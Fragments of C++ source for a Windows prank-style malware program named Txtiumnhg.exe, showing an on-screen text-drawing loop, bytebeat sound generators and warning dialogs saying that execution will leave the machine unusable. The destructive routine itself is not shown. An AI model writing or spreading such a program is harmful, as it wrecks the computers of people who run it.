...
DWORD WINAPI textout(LPVOID lpParam) {
    ...
    int x = 10;
    int y = 10;
    LPCWSTR lpText = L"Txtiumnhg.exe";
    while (1) {
        HDC hdc = GetDC(0);
        x += incrementor * signX;
        y += incrementor * signY;
...
VOID WINAPI sound4() {
    ...
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(10 * (t & 5 * t | t >> 6 | (t & 32768 ? -8 * t / 7 : (t & 65536 ? -9 * t & 100 : -8 * (t & 100)) / 12)));
...
VOID WINAPI sound8() {
    ...
    char buffer[8000 * 60] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t & 16384 ? 6 : 5) * (1 + (3 & t >> 10)) >> (3 & t >> 9) | t >> 2);
...
VOID WINAPI sound9() {
    ...
    char buffer[8000 * 60] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t & 4096 ? t % 65536 < 59392 ? 7 : t & 8 : 16) + (1 & t >> 14)) >> (3 & -t >> (t & 2048 ? 2 : 9)) | t >> (t & 16384 ? t & 4096 ? 10 : 3 : 2));
...
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", L"Txtiumnhg-safety.exe by VietNamLover", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
...
STILL EXECUTE IT?", L"Txtiumnhg.exe by VietNamLover", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
